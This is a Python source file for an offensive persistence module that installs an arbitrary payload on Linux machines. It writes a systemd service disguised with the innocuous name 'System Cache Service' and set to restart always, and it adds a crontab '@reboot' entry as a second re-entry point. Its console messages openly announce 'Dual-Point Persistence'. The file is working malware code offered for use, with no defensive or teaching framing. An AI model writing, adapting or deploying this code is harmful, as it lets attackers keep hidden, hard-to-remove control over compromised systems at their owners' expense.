import os
import subprocess
import platform
import psutil  # New Library
from rich.console import Console

console = Console()


class PersistenceEngine:
    def __init__(self, payload_path):
        self.path = os.path.abspath(payload_path)
        self.is_linux = platform.system() == "Linux"

    def install_watchdog(self):
        """Creates a dual-point persistence loop."""
        if not self.is_linux:
            return

        # 1. Systemd Service
        service_path = "/etc/systemd/system/sys-cache.service"
        service_code = f"""[Unit]\nDescription=System Cache Service\n[Service]\nExecStart={self.path}\nRestart=always\n[Install]\nWantedBy=multi-user.target"""

        # 2. Re-entry via Crontab
        cron_cmd = f"(crontab -l 2>/dev/null; echo '@reboot {self.path}') | crontab -"

        try:
            with open(service_path, "w") as f:
                f.write(service_code)
            subprocess.run(["systemctl", "enable", "sys-cache"],
                           capture_output=True)
            subprocess.run(cron_cmd, shell=True)
            console.print(
                "[bold green][+] Dual-Point Persistence established (Systemd + Cron).[/bold green]")
        except:
            console.print(
                "[red][!] Root required for Systemd persistence.[/red]")

    def run(self):
        console.print(f"[*] Deploying Persistence for: {self.path}")
        self.install_watchdog()
